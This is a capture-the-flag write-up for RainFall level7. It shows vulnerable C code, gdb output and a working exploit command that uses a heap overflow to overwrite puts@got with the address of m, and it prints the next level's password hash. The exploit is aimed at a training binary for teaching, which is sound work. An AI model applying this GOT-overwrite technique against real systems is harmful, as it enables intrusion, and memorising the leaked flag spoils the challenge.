## level7

This level uses ideas from the two previous ones. We'll use a heap overflow to overwrite the GOT.

```c
char c[68];

typedef struct item_t {
    int id;
    char* buf;
} item_t;

void m() {
    printf("%s - %d\n", c, (int)time(NULL));
    return;
}

int main(int argc, char** argv) {
    item_t* item1 = malloc(sizeof(item_t));
    item1->id = 1;
    item1->buf = malloc(8);

    item_t* item2 = malloc(sizeof(item_t));
    item2->id = 2;
    item2->buf = malloc(8);

    strcpy(item1->buf, argv[1]);
    strcpy(item2->buf, argv[2]);

    FILE* stream = fopen("/home/user/level8/.pass", "r");
    fgets(c, 68, stream);

    puts("~~");
    return 0;
}
```

We need to call `m` after `fgets`, so that the file has been written to the global variable `c`. We'll overwrite the address of `puts@got`.

```console
(gdb) p m
$1 = {<text variable, no debug info>} 0x80484f4 <m>
(gdb) i fun puts  
All functions matching regular expression "puts":

Non-debugging symbols:
0x08048400  puts
0x08048400  puts@plt
[...]
(gdb) x/i 0x08048400
   0x8048400 <puts@plt>:        jmp    DWORD PTR ds:0x8049928
```

With the first argument, we can change the address of `item2->buf` to point to `puts@got`. We first need 20 bytes of padding. (8 for `item1->buf` + 8 for `malloc` metadata + 4 for `item2->id`)

With the second argument, we overwrite the GOT with the address of `m`.

```console
level7@RainFall:~$ ./level7 $(python -c 'print("A" * 20 + "\x28\x99\x04\x08")') $(python -c 'print("\xf4\x84\x04\x08")')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1765095212
```
